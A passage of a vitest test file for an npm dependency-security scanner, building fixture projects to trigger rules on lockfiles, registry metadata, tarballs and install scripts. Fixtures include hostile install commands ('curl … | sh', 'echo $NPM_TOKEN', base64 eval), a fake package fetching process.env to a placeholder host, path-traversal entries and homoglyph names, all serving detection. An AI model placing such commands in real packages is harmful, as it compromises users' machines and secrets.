import { createHash } from 'node:crypto';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

import { afterEach, describe, expect, it } from 'vitest';

import type { Finding } from '../../../../../src/core/finding.js';
import { auditDiff } from '../../../../../src/modules/deps/npm/audit-diff.js';
import { groupForPhaseFlag, NPM_GROUPS, type NpmGroupName } from '../../../../../src/modules/deps/npm/groups.js';
import { npmDepthFindings, npmDepthRows } from '../../../../../src/modules/deps/npm/index.js';
import {
  classifyInstance,
  dynamicImportSpec,
  type GraphCopy,
  type ImportedRoot,
} from '../../../../../src/modules/deps/npm/lane-g.js';
import { fixedVersionForRange, withoutWithdrawn } from '../../../../../src/modules/deps/npm/osv-read.js';
import { npmFlag, type NpmDepthInput } from '../../../../../src/modules/deps/npm/types.js';

const GOOD = `sha512-${createHash('sha512').update('phase-261').digest('base64')}`;
const SHA1 = `sha1-${createHash('sha1').update('phase-261').digest('base64')}`;
const YES = `sha512-${createHash('sha512').update('yes').digest('base64')}`;
const LONG = 'A'.repeat(32);
const dirs: string[] = [];

interface AliasCase {
  flag: string;
  ruleIds: readonly string[];
  build: () => Promise<NpmDepthInput>;
}

function clearNpmEnv(): void {
  for (const key of Object.keys(process.env)) {
    if (key.startsWith('FULLSHIELD_EXPERIMENTAL_NPM_') || key === 'FULLSHIELD_NPM_HOME') {
      delete process.env[key];
    }
  }
}

afterEach(async () => {
  clearNpmEnv();
  await Promise.all(dirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true })));
});

async function project(
  extraFiles: Record<string, string>,
  locks: Record<string, string>,
  manifest: Record<string, unknown> = {},
): Promise<NpmDepthInput> {
  const cwd = await mkdtemp(join(tmpdir(), 'fullshield-p261-'));
  dirs.push(cwd);
  const cacheDir = join(cwd, 'cache');
  await mkdir(cacheDir, { recursive: true });
  const manifestRaw = JSON.stringify({ name: 'app', version: '1.0.0', private: true, ...manifest });
  const files: Record<string, string> = { 'package.json': manifestRaw, ...locks, ...extraFiles };
  for (const [rel, text] of Object.entries(files)) {
    const full = join(cwd, rel);
    await mkdir(dirname(full), { recursive: true });
    await writeFile(full, text);
  }
  return { cwd, files: Object.keys(files), manifestRaw, lockTexts: locks, cacheDir, offline: true };
}

function lock(packages: Record<string, unknown>, extra: Record<string, unknown> = {}): string {
  return JSON.stringify({ name: 'app', version: '1.0.0', lockfileVersion: 3, packages, ...extra });
}

function regUrl(name: string): string {
  const base = name.startsWith('@') ? name.slice(name.indexOf('/') + 1) : name;
  return `https://registry.npmjs.org/${name}/-/${base}-1.0.0.tgz`;
}

async function writeJson(dir: string, name: string, body: unknown): Promise<void> {
  await mkdir(dir, { recursive: true });
  await writeFile(join(dir, name), JSON.stringify(body));
}

async function registry(input: NpmDepthInput, name: string, packument: unknown, previous?: unknown): Promise<void> {
  const body: Record<string, unknown> = { packument };
  if (previous !== undefined) {body.previous = previous;}
  await writeJson(join(input.cacheDir, 'registry'), `${name.replaceAll('/', '__')}.json`, body);
}

async function tarball(input: NpmDepthInput, name: string, body: unknown): Promise<void> {
  await writeJson(join(input.cacheDir, 'tarballs'), `${encodeURIComponent(name)}.json`, body);
}

function quietVersion(name: string, extra: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    dist: {
      integrity: 'sha512-same',
      tarball: regUrl(name),
      signatures: [{ keyid: 'abc' }],
      attestations: { subjectVersion: '1.0.0' },
    },
    _npmUser: { name: 'alice' },
    maintainers: [{ name: 'alice' }],
    ...extra,
  };
}

async function regInput(
  name: string,
  versionExtra: Record<string, unknown>,
  opts: {
    lock?: Record<string, unknown>;
    manifest?: Record<string, unknown>;
    previous?: unknown;
    versions?: Record<string, unknown>;
    replaceVersions?: Record<string, unknown>;
    time?: Record<string, string>;
    rootDeps?: Record<string, string>;
    packages?: Record<string, unknown>;
    maintainers?: unknown;
    repository?: unknown;
  } = {},
): Promise<NpmDepthInput> {
  const deps = opts.rootDeps ?? { [name]: '1.0.0' };
  const input = await project({}, {
    'package-lock.json': lock({
      '': { version: '1.0.0', dependencies: deps },
      [`node_modules/${name}`]: {
        version: '1.0.0',
        integrity: 'sha512-same',
        resolved: regUrl(name),
        ...opts.lock,
      },
      ...opts.packages,
    }),
  }, { dependencies: deps, ...opts.manifest });
  await registry(input, name, {
    time: opts.time ?? { '1.0.0': '2020-01-01T00:00:00.000Z' },
    maintainers: opts.maintainers ?? [{ name: 'alice' }],
    repository: opts.repository,
    versions: opts.replaceVersions ?? { '1.0.0': quietVersion(name, versionExtra), ...opts.versions },
  }, opts.previous);
  return input;
}

function picked(findings: Finding[], ids: readonly string[]): Finding[] {
  return findings
    .filter((finding) => ids.includes(finding.ruleId))
    .sort((a, b) => `${a.ruleId}\0${a.file ?? ''}\0${a.line ?? 0}\0${a.snippet ?? ''}`.localeCompare(
      `${b.ruleId}\0${b.file ?? ''}\0${b.line ?? 0}\0${b.snippet ?? ''}`,
    ));
}

async function withFlag(flag: string, run: () => Promise<Finding[]>): Promise<Finding[]> {
  for (const key of Object.keys(process.env)) {
    if (key.startsWith('FULLSHIELD_EXPERIMENTAL_NPM_')) {delete process.env[key];}
  }
  process.env[`FULLSHIELD_EXPERIMENTAL_${flag}`] = '1';
  try {
    return await run();
  } finally {
    delete process.env[`FULLSHIELD_EXPERIMENTAL_${flag}`];
  }
}

const CASES: AliasCase[] = [];

function add(flag: string, ruleIds: readonly string[], build: () => Promise<NpmDepthInput>): void {
  CASES.push({ flag, ruleIds, build });
}

add('NPM_SHRINKWRAP', ['DEPS-SHRINKWRAP-001'], () => project({}, {
  'npm-shrinkwrap.json': lock({ '': { version: '1.0.0' }, 'node_modules/only-shrink': { version: '1.2.3', resolved: regUrl('only-shrink'), integrity: GOOD } }),
}));
add('NPM_SHRINKWRAP', ['DEPS-SHRINKWRAP-002'], () => project({}, {
  'npm-shrinkwrap.json': lock({ '': { version: '1.0.0' }, 'node_modules/left': { version: '1.0.0', resolved: regUrl('left'), integrity: GOOD } }),
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/right': { version: '1.0.0', resolved: regUrl('right'), integrity: GOOD } }),
}));
add('NPM_LOCKVER', ['DEPS-LOCKVER-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' } }, { lockfileVersion: 1 }),
}));
add('NPM_MULTLOCK', ['DEPS-MULTLOCK-001'], () => project(
  { 'yarn.lock': '# yarn lockfile v1\n' },
  { 'package-lock.json': lock({ '': { version: '1.0.0' } }) },
));
add('NPM_ROOTVER', ['DEPS-ROOTVER-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '9.9.9' } }),
}));
add('NPM_NONSEMVER', ['DEPS-NONSEMVER-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/sha-pkg': { version: 'abc123', resolved: regUrl('sha-pkg'), integrity: GOOD } }),
}));
add('NPM_NORESOLVED', ['DEPS-NORESOLVED-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/bare-pkg': { version: '1.2.3' } }),
}));
add('NPM_RESOLVED_HOST', ['DEPS-RESOLVED-HOST-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/host-pkg': { version: '1.2.3', resolved: 'https://example.invalid/host-pkg.tgz', integrity: GOOD } }),
}));
add('NPM_RESOLVED_HTTP', ['DEPS-RESOLVED-HTTP-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/http-pkg': { version: '1.2.3', resolved: 'http://example.invalid/http-pkg.tgz', integrity: GOOD } }),
}));
add('NPM_NOINTEGRITY', ['DEPS-NOINTEGRITY-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/open-pkg': { version: '1.2.3', resolved: regUrl('open-pkg') } }),
}));
add('NPM_WEAKINTEGRITY', ['DEPS-WEAKINTEGRITY-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/weak-pkg': { version: '1.2.3', resolved: regUrl('weak-pkg'), integrity: SHA1 } }),
}));
add('NPM_BADINTEGRITY', ['DEPS-BADINTEGRITY-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/bad-pkg': { version: '1.2.3', resolved: regUrl('bad-pkg'), integrity: 'sha512-****' } }),
}));
add('NPM_LINKDEP', ['DEPS-LINKDEP-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/link-pkg': { version: 'file:./link-pkg' } }),
}));
add('NPM_GITDEP', ['DEPS-GITDEP-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/git-pkg': { version: 'git+https://example.invalid/git-pkg.git' } }),
}));
add('NPM_ALIAS', ['DEPS-NPMALIAS-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/alias-pkg': { version: 'npm:left-pad@1.2.3' } }),
}));
add('NPM_BUNDLED', ['DEPS-BUNDLED-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/bundled-pkg': { version: '1.2.3', inBundle: true, resolved: regUrl('bundled-pkg'), integrity: GOOD } }),
}));
add('NPM_PEER', ['DEPS-PEER-UNDECLARED-001'], () => project(
  { 'src/index.js': "require('peer-pkg');\n" },
  { 'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/peer-pkg': { version: '1.2.3', peer: true, resolved: regUrl('peer-pkg'), integrity: GOOD } }) },
));
add('NPM_OPTIONAL', ['DEPS-OPTIONAL-IMPORT-001'], () => project(
  { 'src/index.js': "require('opt-pkg');\n" },
  { 'package-lock.json': lock({ '': { version: '1.0.0' }, 'node_modules/opt-pkg': { version: '1.2.3', optional: true, resolved: regUrl('opt-pkg'), integrity: GOOD } }) },
));
add('NPM_LOCKPATH', ['DEPS-LOCKPATH-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' }, '../sneaky': { version: '1.2.3', resolved: regUrl('sneaky'), integrity: GOOD } }),
}));
add('NPM_LOCKOMIT', ['DEPS-LOCKOMIT-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0', dependencies: {} } }),
}, { dependencies: { missing: '1.0.0' } }));
add('NPM_DEVPROD', ['DEPS-DEV-PROD-EDGE-001'], () => project({}, {
  'package-lock.json': lock({
    '': { version: '1.0.0', dependencies: { 'dev-pkg': '1.0.0' } },
    'node_modules/dev-pkg': { version: '1.0.0', dev: true, resolved: regUrl('dev-pkg'), integrity: GOOD },
  }),
}));

add('NPM_FLOAT', ['DEPS-FLOAT-001', 'DEPS-FLOAT-002'], () => project({}, {}, {
  private: false,
  dependencies: { 'star-pkg': '*', 'floor-pkg': '>=1.0.0' },
}));
add('NPM_GITSPEC', ['DEPS-GITSPEC-001'], () => project({}, {}, {
  dependencies: { 'git-spec': 'git+https://example.invalid/git-spec.git' },
}));
add('NPM_FILESPEC', ['DEPS-FILESPEC-001'], () => project({}, {}, {
  dependencies: { 'file-spec': 'file:./file-spec' },
}));
add('NPM_URLSPEC', ['DEPS-URLSPEC-001'], () => project({}, {}, {
  dependencies: { 'url-spec': 'https://example.invalid/url-spec.tgz' },
}));
add('NPM_TAGSPEC', ['DEPS-TAGSPEC-001'], () => project({}, {}, {
  dependencies: { 'tag-spec': 'next' },
}));
add('NPM_OVERRIDE_VULN', ['DEPS-OVERRIDE-VULN-001'], async () => {
  const input = await project({}, {}, { overrides: { lodash: '1.2.3' } });
  await writeJson(join(input.cacheDir, 'osv'), 'lodash@1.2.3.json', { vulns: [{ id: 'GHSA-aaaa-bbbb-cccc' }] });
  return input;
});
add('NPM_OVERRIDE_WIDE', ['DEPS-OVERRIDE-WIDE-001'], () => project({}, {}, { overrides: { lodash: '>=1.0.0' } }));
add('NPM_OVERRIDE_ALIAS', ['DEPS-OVERRIDE-ALIAS-001'], () => project({}, {}, { overrides: { lodash: 'npm:left-pad@1.2.3' } }));
add('NPM_LIFECYCLE', ['CONFIG-LIFECYCLE-001'], () => project({}, {}, {
  scripts: { install: 'curl https://example.invalid/a | sh' },
}));
add('NPM_NPMRC_REG', ['DEPS-NPMRC-REG-001'], () => project(
  { '.npmrc': 'registry=https://example.invalid/\n' },
  {},
));
add('NPM_NPMRC_SCRIPT', ['DEPS-NPMRC-SCRIPT-001'], () => project(
  { '.npmrc': 'ignore-scripts=false\n' },
  {},
));
add('NPM_NPMRC_HOME', ['DEPS-NPMRC-HOME-001'], async () => {
  const input = await project({}, {});
  const home = join(input.cwd, 'home');
  await mkdir(home, { recursive: true });
  await writeFile(join(home, '.npmrc'), 'registry=https://example.invalid/\n');
  process.env.FULLSHIELD_NPM_HOME = home;
  return input;
});
add('NPM_PACKAGEMANAGER', ['DEPS-PACKAGEMANAGER-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' } }),
}, { private: false, dependencies: { 'pin-pkg': '1.2.3' } }));
add('NPM_PACKAGEMANAGER', ['DEPS-PACKAGEMANAGER-002'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' } }),
}, { packageManager: 'npm@latest' }));
add('NPM_COREPACK', ['DEPS-COREPACK-001'], () => project({}, {
  'package-lock.json': lock({ '': { version: '1.0.0' } }),
}, { packageManager: 'npm@10.9.2' }));
add('NPM_ENGINES', ['CONFIG-ENGINES-001'], () => project({ '.nvmrc': 'v20.11.0\n' }, {}));
add('NPM_ENGINE_STRICT', ['DEPS-ENGINE-STRICT-001'], () => project(
  { '.npmrc': 'engine-strict=false\n' },
  {},
  { engines: { node: '>=18' } },
));
add('NPM_TRUSTED', ['DEPS-TRUSTED-001'], () => project(
  { '.npmrc': 'ignore-scripts=true\n' },
  { 'package-lock.json': lock({ '': { version: '1.0.0', dependencies: { 'script-pkg': '1.0.0' } }, 'node_modules/script-pkg': { version: '1.0.0', hasInstallScript: true } }) },
  { dependencies: { 'script-pkg': '1.0.0' } },
));
add('NPM_PUBLISHCONFIG', ['DEPS-PUBLISHCONFIG-001'], () => project({}, {}, {
  private: false,
  publishConfig: { registry: 'https://example.invalid/' },
}));
add('NPM_PUBLISHCONFIG', ['DEPS-PUBLISHCONFIG-002'], () => project({}, {}, {
  private: true,
  publishConfig: { access: 'public' },
}));
add('NPM_BINSHADOW', ['DEPS-BIN-SHADOW-001'], () => project({}, {
  'package-lock.json': lock({
    '': { version: '1.0.0', dependencies: { 'bin-pkg': '1.0.0' } },
    'node_modules/bin-pkg': { version: '1.0.0', bin: { fs: 'bin.js' } },
  }),
}, { dependencies: { 'bin-pkg': '1.0.0' } }));
add('NPM_OSCPU', ['DEPS-OSCPU-001'], () => project({}, {
  'package-lock.json': lock({
    '': { version: '1.0.0', dependencies: { 'cpu-pkg': '1.0.0' } },
    'node_modules/cpu-pkg': { version: '1.0.0', os: [`!${process.platform}`] },
  }),
}, { dependencies: { 'cpu-pkg': '1.0.0' } }));

function reg(flag: string, id: string, build: () => Promise<NpmDepthInput>): void {
  add(flag, [id], build);
}

reg('NPM_REG_INTEGRITY', 'DEPS-REG-INTEGRITY-001', () => regInput('int-pkg', {
  dist: { integrity: 'sha512-other', tarball: regUrl('int-pkg'), signatures: [{ keyid: 'abc' }], attestations: { subjectVersion: '1.0.0' } },
}));
reg('NPM_REG_TARBALL', 'DEPS-REG-TARBALL-001', () => regInput('tar-url', {
  dist: { integrity: 'sha512-same', tarball: regUrl('other-tar'), signatures: [{ keyid: 'abc' }], attestations: { subjectVersion: '1.0.0' } },
}));
reg('NPM_REG_DEPRECATED', 'DEPS-REG-DEPRECATED-001', () => regInput('dep-pkg', { deprecated: 'gone' }));
reg('NPM_REG_UNPUBLISHED', 'DEPS-REG-UNPUBLISHED-001', () => regInput('miss-pkg', {}, {
  replaceVersions: { '2.0.0': {} },
  time: { '1.0.0': '2020-01-01T00:00:00.000Z' },
}));
reg('NPM_REG_NPMUSER', 'DEPS-REG-NPMUSER-001', () => regInput('user-pkg', {
  _npmUser: { name: 'eve' },
  maintainers: [{ name: 'bob' }],
}));
reg('NPM_REG_MAINTAINER', 'DEPS-REG-MAINTAINER-001', () => regInput('maint-pkg', {}, {
  previous: { maintainers: ['old-user'] },
  maintainers: [{ name: 'new-user' }],
}));
reg('NPM_REG_PROV_ABSENT', 'DEPS-REG-PROV-ABSENT-001', () => regInput('prov-pkg', {
  dist: { integrity: 'sha512-same', tarball: regUrl('prov-pkg') },
}));
reg('NPM_REG_BUILDER', 'DEPS-REG-BUILDER-001', () => regInput('build-pkg', {
  dist: {
    integrity: 'sha512-same',
    tarball: regUrl('build-pkg'),
    signatures: [{ keyid: 'abc' }],
    attestations: { builder: { id: 'https://example.invalid/builder' }, subjectVersion: '1.0.0' },
  },
}));
reg('NPM_REG_REPO', 'DEPS-REG-REPO-001', () => regInput('repo-pkg', {
  dist: {
    integrity: 'sha512-same',
    tarball: regUrl('repo-pkg'),
    signatures: [{ keyid: 'abc' }],
    attestations: { repo: 'https://github.com/new/two', subjectVersion: '1.0.0' },
  },
}, { previous: { repo: 'https://github.com/old/one' } }));
reg('NPM_REG_SUBJECT', 'DEPS-REG-SUBJECT-001', () => regInput('subj-pkg', {
  dist: {
    integrity: 'sha512-same',
    tarball: regUrl('subj-pkg'),
    signatures: [{ keyid: 'abc' }],
    attestations: { subjectVersion: '9.9.9' },
  },
}));
reg('NPM_REG_TIME', 'DEPS-REG-TIME-001', () => regInput('time-pkg', {}, { time: { '1.0.0': '2999-01-01T00:00:00.000Z' } }));
reg('NPM_REG_TRANSITIVE_AGE', 'DEPS-REG-AGE-001', () => regInput('young-pkg', {}, {
  rootDeps: { parent: '1.0.0' },
  packages: {
    'node_modules/parent': { version: '1.0.0', integrity: 'sha512-same', resolved: regUrl('parent') },
    'node_modules/parent/node_modules/young-pkg': { version: '1.0.0', integrity: 'sha512-same', resolved: regUrl('young-pkg') },
  },
  time: { '1.0.0': new Date().toISOString() },
}));
reg('NPM_REG_INSTALLSCRIPT', 'DEPS-REG-INSTALLSCRIPT-001', () => regInput('inst-pkg', { hasInstallScript: true }));
reg('NPM_REG_SIGNATURES', 'DEPS-REG-SIGNATURES-001', () => regInput('sig-pkg', {
  dist: { integrity: 'sha512-same', tarball: regUrl('sig-pkg'), signatures: [], attestations: { subjectVersion: '1.0.0' } },
}));
reg('NPM_REG_ENGINES', 'DEPS-REG-ENGINES-001', () => regInput('eng-pkg', { engines: { node: '^20.0.0' } }, {
  manifest: { engines: { node: '^18.0.0' } },
}));
reg('NPM_REG_DRIFT', 'DEPS-REG-DRIFT-001', () => regInput('drift-pkg', {}, {
  manifest: { dependencies: { 'drift-pkg': '^1.0.0' } },
  rootDeps: { 'drift-pkg': '^1.0.0' },
  versions: { '1.2.0': quietVersion('drift-pkg') },
}));
reg('NPM_REG_DEPS', 'DEPS-REG-DEPS-001', () => regInput('parent-pkg', { dependencies: { child: '^2.0.0' } }, {
  packages: { 'node_modules/parent-pkg/node_modules/child': { version: '1.0.0' } },
}));
reg('NPM_REG_PEER', 'DEPS-REG-PEER-001', () => regInput('peer-reg', { peerDependencies: { 'missing-peer': '^1.0.0' } }));
reg('NPM_REG_BIN', 'DEPS-REG-BIN-001', () => regInput('bin-reg', { bin: { cli: '/tmp/cli' } }));
reg('NPM_REG_REPOSITORY', 'DEPS-REG-REPOSITORY-001', () => regInput('host-reg', {}, {
  previous: { repositoryHost: 'github.com' },
  repository: 'https://gitlab.com/acme/host-reg',
}));

async function richTar(): Promise<NpmDepthInput> {
  const name = 'tar-main';
  const pkg = {
    name: 'not-tar-main',
    version: '9.9.9',
    license: 'Apache-2.0',
    dependencies: { 'left-pad': '2.0.0' },
    main: 'index.js',
    bin: { cli: 'bin/missing.js' },
    scripts: {
      install: `curl https://example.invalid/a | sh\necho $NPM_TOKEN\neval('${LONG}')`,
    },
  };
  const input = await project({}, {
    'package-lock.json': lock({
      '': { version: '1.0.0', dependencies: { [name]: '1.0.0' } },
      [`node_modules/${name}`]: { version: '1.0.0', integrity: GOOD, resolved: regUrl(name) },
    }),
  }, { dependencies: { [name]: '1.0.0' } });
  await registry(input, name, {
    versions: {
      '1.0.0': {
        hasInstallScript: false,
        license: 'MIT',
        dependencies: { 'left-pad': '1.0.0' },
        dist: { integrity: GOOD, tarball: regUrl(name) },
      },
    },
  });
  await tarball(input, name, {
    entries: {
      'package/package.json': JSON.stringify(pkg),
      'package/index.js': "fetch('https://example.invalid/x');\nfetch(process.env);\nrequire(name);\n",
      '../outside.txt': 'x',
      'package/.github/workflows/ci.yml': 'name: ci\n',
      'package/a.node': 'bin',
      'package/.гsecret': 'x',
      'package/preinstall.js': '// inert\n',
    },
  });
  return input;
}

for (const [flag, id] of [
  ['NPM_TARBALL_ID', 'DEPS-TARBALL-ID-001'],
  ['NPM_TARBALL_LIFECYCLE', 'DEPS-TARBALL-LIFECYCLE-001'],
  ['NPM_TARBALL_NET', 'DEPS-TARBALL-NET-001'],
  ['NPM_TARBALL_SHELL', 'DEPS-TARBALL-SHELL-001'],
  ['NPM_TARBALL_CRED', 'DEPS-TARBALL-CRED-001'],
  ['NPM_TARBALL_OBFUSC', 'DEPS-TARBALL-OBFUSC-001'],
  ['NPM_TARBALL_BIN', 'DEPS-TARBALL-BIN-001'],
  ['NPM_TARBALL_NATIVE', 'DEPS-TARBALL-NATIVE-001'],
  ['NPM_TARBALL_HOOK', 'DEPS-TARBALL-HOOK-001'],
  ['NPM_TARBALL_HIDDEN', 'DEPS-TARBALL-HIDDEN-001'],
  ['NPM_TARBALL_PATH', 'DEPS-TARBALL-PATH-001'],
  ['NPM_TARBALL_LICENSE', 'DEPS-TARBALL-LICENSE-001'],
  ['NPM_TARBALL_MANIFEST', 'DEPS-TARBALL-MANIFEST-001'],
  ['NPM_TARBALL_INSTALLJS', 'DEPS-TARBALL-INSTALLJS-001'],
  ['NPM_TARBALL_TOPLEVEL', 'DEPS-TARBALL-TOPLEVEL-001'],
  ['NPM_TARBALL_ENV', 'DEPS-TARBALL-ENV-001'],
  ['NPM_TARBALL_DYNAMIC', 'DEPS-TARBALL-DYNAMIC-001'],
] as const) {
  add(flag, [id], richTar);
}

add('NPM_TARBALL_HASH', ['DEPS-TARBALL-HASH-001'], async () => {
  const name = 'hash-pkg';
  const input = await project({}, {
    'package-lock.json': lock({
      '': { version: '1.0.0', dependencies: { [name]: '1.0.0' } },
      [`node_modules/${name}`]: { version: '1.0.0', integrity: YES, resolved: regUrl(name) },
    }),
  }, { dependencies: { [name]: '1.0.0' } });
  await tarball(input, name, { bytesBase64: Buffer.from('nope').toString('base64') });
  return input;
});
add('NPM_TARBALL_GATE', ['DEPS-TARBALL-SKIP-001'], () => project({}, {
  'package-lock.json': lock({
    '': { version: '1.0.0', dependencies: { 'gate-pkg': '1.0.0' } },
    'node_modules/gate-pkg': { version: '1.0.0', resolved: regUrl('gate-pkg') },
  }),
}, { dependencies: { 'gate-pkg': '1.0.0' } }));
add('NPM_TARBALL_SIZE', ['DEPS-TARBALL-SIZE-001'], async () => {
  const name = 'size-pkg';
  const entries: Record<string, string> = {};
  for (let i = 0; i < 2001; i += 1) {entries[`package/f${String(i)}.txt`] = 'x';}
  const input = await project({}, {
    'package-lock.json': lock({
      '': { version: '1.0.0', dependencies: { [name]: '1.0.0' } },
      [`node_modules/${name}`]: { version: '1.0.0', integrity: GOOD, resolved: regUrl(name) },
    }),
  }, { dependencies: { [name]: '1.0.0' } });
  await tarball(input, name, { entries });
  return input;
});

async function scriptPkg(
  name: string,
  entry: Record<string, unknown>,
  descriptor: Record<string, unknown>,
  manifest: Record<string, unknown> = {},
  packages: Record<string, unknown> = {},
): Promise<NpmDepthInput> {
  const deps = { ...(manifest.dependencies as Record<string, string> | undefined), [name]: '1.0.0' };
  const input = await project({}, {
    'package-lock.json': lock({
      '': { version: '1.0.0', dependencies: deps, ...((manifest.devDependencies !== undefined) ? {} : {}) },
      [`node_modules/${name}`]: { version: '1.0.0', ...entry },
      ...packages,
    }),
  }, { ...manifest, dependencies: { ...deps, ...(manifest.dependencies as Record<string, unknown> | undefined) } });
  if (descriptor !== undefined) {await tarball(input, name, descriptor);}
  return input;
}

add('NPM_SCRIPT_TRANSITIVE', ['DEPS-SCRIPT-TRANSITIVE-001'], () => project({}, {
  'package-lock.json': lock({
    '': { version: '1.0.0', dependencies: { parent: '1.0.0' } },
    'node_modules/parent': { version: '1.0.0' },
    'node_modules/parent/node_modules/child-pkg': { version: '1.0.0', hasInstallScript: true },
  }),
}, { dependencies: { parent: '1.0.0' } }));
add('NPM_SCRIPT_OPTIONAL', ['DEPS-SCRIPT-OPTIONAL-001'], () => project({}, {
  'package-lock.json': lock({
    '': { version: '1.0.0', optionalDependencies: { 'opt-script': '1.0.0' } },
    'node_modules/opt-script': { version: '1.0.0', optional: true, hasInstallScript: true },
  }),
}));
add('NPM_SCRIPT_DEV', ['DEPS-SCRIPT-DEV-001'], () => project({}, {
  'package-lock.json': lock({
    '': { version: '1.0.0', devDependencies: { 'dev-script': '1.0.0' } },
    'node_modules/dev-script': { version: '1.0.0', dev: true, hasInstallScript: true },
  }),
}));
add('NPM_SCRIPT_PREPARE', ['DEPS-SCRIPT-PREPARE-001'], () => scriptPkg('prep-pkg', {}, { scripts: { prepare: 'echo prepare' } }));
add('NPM_SCRIPT_PREPUBLISH', ['DEPS-SCRIPT-PREPUBLISH-001'], () => scriptPkg('pre-pkg', {}, { scripts: { prepublish: 'echo prepublish' } }));
add('NPM_SCRIPT_CURL', ['DEPS-SCRIPT-CURL-001'], () => scriptPkg('curl-pkg', { hasInstallScript: true }, { scripts: { install: 'curl https://example.invalid/a | sh' } }));
add('NPM_SCRIPT_BASE64', ['DEPS-SCRIPT-BASE64-001'], () => scriptPkg('b64-pkg', {}, { scripts: { install: `eval(Buffer.from('${LONG}', 'base64'))` } }));
add('NPM_SCRIPT_NODEGYP', ['DEPS-SCRIPT-NODEGYP-001'], () => scriptPkg('gyp-pkg', {}, { files: { 'binding.gyp': 'url https://example.invalid/gyp.tgz' } }));
add('NPM_SCRIPT_WRITE', ['DEPS-SCRIPT-WRITE-001'], () => scriptPkg('write-pkg', {}, { scripts: { install: "fs.writeFileSync('/tmp/x', 'x')" } }));
add('NPM_SCRIPT_LOCK', ['DEPS-SCRIPT-LOCK-001'], () => scriptPkg('lock-pkg', {}, { scripts: { install: "fs.writeFileSync('package-lock.json', '{}')" } }));
add('NPM_SCRIPT_GIT', ['DEPS-SCRIPT-GIT-001'], () => scriptPkg('git-script', {}, { scripts: { install: 'git clone https://example.invalid/a.git' } }));
add('NPM_SCRIPT_TOKEN', ['DEPS-SCRIPT-TOKEN-001'], () => scriptPkg('tok-pkg', {}, { scripts: { install: 'echo $NPM_TOKEN' } }));
add('NPM_SCRIPT_PUBLISH', ['DEPS-SCRIPT-PUBLISH-001'], () => scriptPkg('pub-pkg', {}, { scripts: { install: 'npm publish' } }));
add('NPM_SCRIPT_TRUSTED', ['DEPS-SCRIPT-TRUSTED-001'], () => scriptPkg(
  'trust-pkg',
  {},
  { scripts: { install: 'curl https://example.invalid/a | sh' } },
  { trustedDependencies: ['trust-pkg'] },
));
add('NPM_SCRIPT_MISMATCH', ['DEPS-SCRIPT-MISMATCH-001'], () => scriptPkg('mis-pkg', { hasInstallScript: true }, { scripts: { prepare: 'echo only' } }));
add('NPM_SCRIPT_MULTI', ['DEPS-SCRIPT-MULTI-001'], () => scriptPkg('multi-pkg', {}, { scripts: { preinstall: 'echo a', install: 'echo b' } }));
add('NPM_SCRIPT_BIN', ['DEPS-SCRIPT-BIN-001'], () => scriptPkg('bin-script', { bin: { cli: 'install.js' } }, { scripts: { install: 'node install.js' } }));
add('NPM_SCRIPT_SHEBANG', ['DEPS-SCRIPT-SHEBANG-001'], () => scriptPkg('shebang-pkg', {}, {
  scripts: { install: 'node install.js' },
  files: { 'install.js': '#!/usr/bin/perl\n' },
}));
add('NPM_SCRIPT_COND', ['DEPS-SCRIPT-COND-001'], () => scriptPkg('cond-pkg', {}, {
  scripts: { install: "if (process.env.CI) {\n  console.log('ci');\n} else {\n  curl https://example.invalid/a | sh\n}\n" },
}));
add('NPM_SCRIPT_ROLLUP', ['DEPS-SCRIPT-ROLLUP-001'], () => {
  const packages: Record<string, unknown> = { '': { version: '1.0.0', dependencies: {} as Record<string, string> } };
  const deps: Record<string, string> = {};
  for (let i = 0; i < 26; i += 1) {
    const name = `roll-${String(i)}`;
    deps[name] = '1.0.0';
    packages[`node_modules/${name}`] = { version: '1.0.0', hasInstallScript: true };
  }
  (packages[''] as { dependencies: Record<string, string> }).dependencies = deps;
  return project({}, { 'package-lock.json': lock(packages) }, { dependencies: deps });
});

add('NPM_SCOPE_TYPO', ['DEPS-SCOPE-TYPO-001'], () => project({}, {}, { devDependencies: { '@babl/core': '1.0.0' } }));
add('NPM_HOMOGLYPH', ['DEPS-HOMOGLYPH-001'], () => project({}, {}, { dependencies: { '\u0435xpress': '1.0.0' } }));
add('NPM_BIDI', ['DEPS-BIDI-001'], () => project({}, {}, { dependencies: { 'express\u202E': '1.0.0' } }));
add('NPM_MIXEDSCRIPT', ['DEPS-MIXEDSCRIPT-001'], () => project({}, {}, { dependencies: { 'expres\u0441': '1.0.0' } }));
add('NPM_SEPARATOR', ['DEPS-SEPARATOR-001'], () => project({}, {}, { dependencies: { 'socket_io.client': '1.0.0' } }));
add('NPM_REPEAT', ['DEPS-REPEAT-001'], () => project({}, {}, { dependencies: { 'react-react': '1.0.0' } }));
add('NPM_SUFFIX', ['DEPS-SUFFIX-001'], () => project({}, {}, { dependencies: { 'lodash-js': '1.0.0' } }));
add('NPM_SCOPE_NEW', ['DEPS-SCOPE-NEW-001'], async () => {
